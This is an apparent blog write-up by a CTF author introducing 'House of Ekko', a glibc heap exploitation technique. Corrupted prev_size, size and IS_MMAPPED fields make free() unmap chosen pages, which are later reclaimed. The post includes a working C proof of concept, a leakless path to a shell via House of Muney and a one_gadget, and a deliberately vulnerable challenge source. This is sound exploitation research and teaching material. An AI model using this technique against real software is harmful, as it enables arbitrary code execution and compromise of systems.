---
layout: post
title: House of ekko | Heap exploitation technique
description: A new heap exploitation technique i made for Securinets Quals 2026
tags: House Heap Pwn 
---

THIS IS ME FROM THE FUTURE : hope everyone enjoyed the ctf 😉 

This is my yearly reminder atp , that i'm looking for a VR , Pentest Or Red teaming internship for early 2027 (remote or with relocation) . Please if you have any oppotunities , DM me on discord for further details. 
<img src="/assets/posts/house/please.jpg" alt="please" width="100" height=100>
~~yes i'm getting cooked that i have to self promo~~  




## context
Since i'm authoring some pwn challs for Securinets CTF 2026 , i thought i'd put in some effort to find a new heap exploit technique that makes a good heap challenge . In the end , i decided to name this house **House of Ekko** .

~~~RIOT IF YOURE READING THIS FSM , BUFF EKKO PLEASE IM BEGGING~~

## attack surfaces 
having a heap exploit primitive in a more recent GLIBC , whether being an overflow , UAF , double free ... leads to usually one of these situations : 
- arbitrary allocation primitive : 
    - tcache free list corruption , most suitable , arbitrary , check free , allocation when you corrupt the freelist , requires a heap leak
    - tcache_stashing_unlink_attack.c
- attacks that do `arbitrary heap value write`
    - unsorted bin attacks (in the past)
    - large bin attacks 
    - fastbin/small-bin tcache consolidation , leads to `arbitrary heap val write` on inserting the the 7th chunk
    ...

also when looking for an idea , i was testing on `glibc 2.43` . this more recent libc had added some more checks that would prevent some of these attacks , like this **[large bin attack killer](https://patchwork.sourceware.org/project/glibc/patch/20250214053454.2346370-1-benjamin.p.kallus.gr@dartmouth.edu/#195227)** . Also in this libc version and onwards , fastbin will be removed . This leaves me with only `small bins` to research (no , unsorted bins are not real) which i know is already widely exploited so i dont think thats the best attack surface i could find . 

## looking for a new attack surface 

i think at this time, i tried a bunch of stuff , that didnt work out , or that ultimately led to an already existing technique when searching for a similar idea , like this [house of water](https://github.com/shellphish/how2heap/blob/master/glibc_2.36/house_of_water.c) , what it does is basically forge a new chunk header inside `tcache_per_thread struct` using the `int_16` used by tcache to keep track of how many freed chunk in each `tcache entry`

## THE breakthrough

one of the later ideas that came to mind is somehow making use of the `IS_MMAPED` bit in the chunk header . Lets have a basic look at a chunk header 

![img](/assets/posts/house/header.png)

a bunch of technique already made use of the first bit `Previous chunk in use` , like backwards consolidation technique or whatever . But i never saw or heard of a technique that makes use of the `IS_MMAPED` bit . 

So if we set this bit on a normal heap chunk , what happens when we free it ? 

## Libc Internals 

calling free , if tcache is full or no tcache is configured ends up calling `_int_free_chunk` or simply `__int_free` in older versions 

```c
static void
_int_free_chunk (mstate av, mchunkptr p, INTERNAL_SIZE_T size, int have_lock)
{
  /*
    Consolidate other non-mmapped chunks as they arrive.
  */

  if (!chunk_is_mmapped(p)) {
    ...
    _int_free_merge_chunk (av, p, size);
    ...
  }

  /*
    If the chunk was allocated via mmap, release via munmap().
  */
  else {
    ...
    munmap_chunk (p);
    ...
  }
}

```

so just setting up that `IS_MMAPED` bit will get us to the `munmap_chunk` function

```c
static void
munmap_chunk (mchunkptr p)
{
  size_t pagesize = GLRO (dl_pagesize);

  assert (chunk_is_mmapped (p));

  uintptr_t mem = (uintptr_t) chunk2mem (p);
  uintptr_t block = mmap_base (p);
  size_t total_size = mmap_size (p);
  /* Unfortunately we have to do the compilers job by hand here.  Normally
     we would test BLOCK and TOTAL-SIZE separately for compliance with the
     page size.  But gcc does not recognize the optimization possibility
     (in the moment at least) so we combine the two values into one before
     the bit test.  */
  if (__glibc_unlikely ((block | total_size) & (pagesize - 1)) != 0
      || __glibc_unlikely (!powerof2 (mem & (pagesize - 1))))
    malloc_printerr ("munmap_chunk(): invalid pointer");

  /* If munmap failed the process virtual memory address space is in a
     bad shape.  Just leave the block hanging around, the process will
     terminate shortly anyway since not much can be done.  */
  __munmap ((char *) block, total_size);
}
```

not a lot of checks to fullfill , and most definetely no pointer comparaisons like `bck` and `fwd` chain pointer in linked lists 
 
1. **block**
we can see that the final chunk that got to `__munmap` , isn't actually `p` but `block=mmap_base (p)` . here is `mmap_base()` code : 

```c
static __always_inline uintptr_t
mmap_base (mchunkptr p)
{
  return (uintptr_t) p - mmap_base_offset (p);
}
```

and `mmap_base_offset()` is 
```c
static __always_inline size_t
mmap_base_offset (mchunkptr p)
{
  return prev_size (p) & ~MMAP_HP;
}
```

which means the final chunk that gets to `__munmap` is simply `p - prev_size` 

2. **total_size**

```c
static __always_inline size_t
mmap_size (mchunkptr p)
{
  return mmap_base_offset (p) + chunksize (p) + CHUNK_HDR_SZ;
}
```
which means `total_size= prev_size + size + 0x10`

3. **combining both values** 
suppose we have a heap primitve where we can control both `prev_size` and `size`. 

`munmapped_chunk=p - prev_size` , so if `prev_size = p - target_address` ,  `munmapped_chunk == target_address`

one note is that if p and target_address are from withing fixed offset memory segment , we wouldn't need a leak to chose a random address from that memory segment . This will help us later in the leakless part . 

and `total_size= prev_size + size + 0x10` which is equivalent to `total_size= p - target_address + size + 0x10 ` , so if wanted to munmap some `target_page_number` , we need to pass a size equal to `size = target_page_number - (p - target_address ) - 0x10`

to bypass these checks , we just need to make sure that `block + total_size` is page aligned , and if `mem` is page_aligned , second check should be bypassed as well  
```c
if (__glibc_unlikely ((block | total_size) & (pagesize - 1)) != 0
      || __glibc_unlikely (!powerof2 (mem & (pagesize - 1))))
    malloc_printerr ("munmap_chunk(): invalid pointer");
```


## POC 
```c
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <unistd.h>
#include <assert.h>
int main()

{
    setbuf(stdout, NULL);
    setbuf(stdin, NULL);

    /////////////////////////////////////// setup , skip
    long tls = (long)&system - 0x4fcc0;
    printf("tls base : %p\n", tls);

    void *heap = (void *)sbrk(0);
    printf("heap : %p\n", heap);
    printf("diff %p\n", (long)(tls - (long)heap));
    free(malloc(0x40));
    malloc(0xca0); // this is needed to make next allocation alligned
    long *ptr = malloc(0x10); // this will be the victim chunk we'll corrupt
    ///////////////////////////////////////

    // look up the leakless part for why i want to reclain this address
    long target = tls + 0x27000 + 0x100000; // target page to unmap , then reallocate for user overwrite

    long freed_size = 0x21000;              // size to munmap , at least 0x20000 for malloc later to be able to mmap it

    puts("");
    printf("target page to free : %p\n\n", target);
    printf("corrupting prev_size and size of victim chunk: %p\n", ptr);
    printf("press to free the corrupted chunk\n");

    ptr[-2] = ~((long)(target - (long)heap - 0x1000)) + 1; // equivalent to ~(target - victim) ; thus heap and target address leak needed
    ptr[-1] = (freed_size - ptr[-2] - 0x10) | 0x2;         //


    getchar();
    free(ptr); // this internally does the below mumap line
    // int res = munmap(target , 0x21000);

    puts("press to allocate (reclaim) the freed pages");
    getchar();

    void *reclaim = malloc(0x20000 - 0x10); // this mmaps(0x21000) , and reclaims the freed pages , this internally is equivalent to the mmap line above
    printf("reclaimed address %p , vs target address %p\n ", reclaim, target);
    assert((reclaim - 0x10) == (void *)target);
}
```

![poc](/assets/posts/house/poc.png)


## pros 
1. we can reclaim pages relative to the corrupted chunk without any leaks , because `prev_size` that we need to corrupt is `p - target_address` . Which means if they are at fixed offset , we dont need any leaks
2. we can reclaim Read-Only pages 
3. if we munmap a page with size x , when we mmap(x) or malloc(x) , the kernel will give the latest freed chunk with that size (idk about chunks with more size) . x need to meet this condition tho `x >= mp_.mmap_threshold` which is initialized at ``0x21000`

## cons 

1. address needs to be page aligned
2. we need to be careful when mumapping pages , not break anything before we can reclaim those pages .
3. ability to allocate at least `0x21000` bytes 
4. if we munmap(p,0x21000) : x needs to be memory aligned , and the memory segment `[p , p+0x21000]` needs to be available and contiguous , so we can reclaim later 

let's suppose we wanna reclaim this segment 

![cons](/assets/posts/house/cons.png)

munmap will try to unmap the whole segment `[0x00005b834136b000 : 0x00005b834136b000+0x21000]` . but that segment doesnt exist , only this segment exists `[0x00005b834136b000 : 0x00005b834136b000+0x5000]` . munmap will still unmap these pages , and return them to the page allocator , but the marked size is `0x5000` , which is a size we can never reclaim with using `malloc()` alone . So later on when we do `malloc(0x21000)` , it won't give us that segment . This might still be useful where `mmap()` is involved 

## NOT YET

![not_yet](/assets/posts/house/not_yet.png)

this primitive allows us to munmap and reclaim arbitrary pages with at least `0x21000` contiguous memory , it can be useful in big apps that have larger heap , or BSS . But still , we need a reliable way to constantly achieve RCE , thats when we get to the next part 

## House of Muney revived 

the primitive allows us to munmap and reclaim at least arbitrary 0x21000 pages , even `read only pages` . Turns out there was an old exploitation technique that dealt with a similar issue , but was killed because of `tls` section being loaded right before libc . 
I encourage you to read about this [technique](https://maxwelldulin.com/BlogPost/House-of-Muney-Heap-Exploitation) , it's a trully fascinating one . I will not cover details mentionned here . 


with our primitve , we can just bypass `tls` and directly free the sequence of pages that contain the `st_value` of the `exit()` function which will always be called. 
so when we exit , we trigger `exit() -> dl_resolve trying to resolve exit address in libc -> call libc_base+st_value ()` , thus we can overwrite `st_value` with a `one_gadget` offset . 

this function pointer overwrite doesnt require any type of libc leak as we can see 

## achieving full leakless chain 

the POC mentionned above corrupts a chunk `p` located in the heap , but we can still corrupt an `mmaped` chunk that we got using `malloc(0x21000)` in the same way , why would we do that ? 
That's because usually the kernel mmaps pages right behind `tls` , which is also right behind `libc` . In other words , our corrupted chunk would be at a constant offset from libc . And according to `pros .1` , we can now target any pages at constant offset from it !!

## full chain 
Chaining the last both steps , we can achieve a full shell with 0 leaks , 0 brute force . The only condition is the ability the allocate at least `0x21000` bytes

if you are interested in the leakless POC , just solve the [challenge](https://github.com/buddurid/House-of-ekko) lol.


here is the chall source with every mitigation enabled : 

```c
void alloc()
{
    int index, size;
    puts("Secret's index:");
    scanf("%d%*c", &index);
    if (index < 0 || index >= n_secrets)
    {
        puts("Invalid index");
        exit(1);
    }
    puts("How big is your secret:");
    scanf("%d%*c", &size);
    if (size <= 0)
    {
        puts("Invalid size");
        exit(1);
    }
    secrets[index] = malloc(size);
    if (secrets[index] == NULL)
    {
        puts("malloc error");
        exit(1);
    }
    printf("content: ");
    fgets(secrets[index], size, stdin);
    puts("Secret added");
}

void delete()
{
    int index;
    puts("Secret's index:");
    scanf("%d%*c", &index);
    if (index < 0 || index >= n_secrets)
    {
        puts("Invalid index");
        exit(1);
    }
    if (secrets[index] == NULL)
    {
        puts("Secret not digged up");
        exit(1);
    }
    free(secrets[index]);
}
```

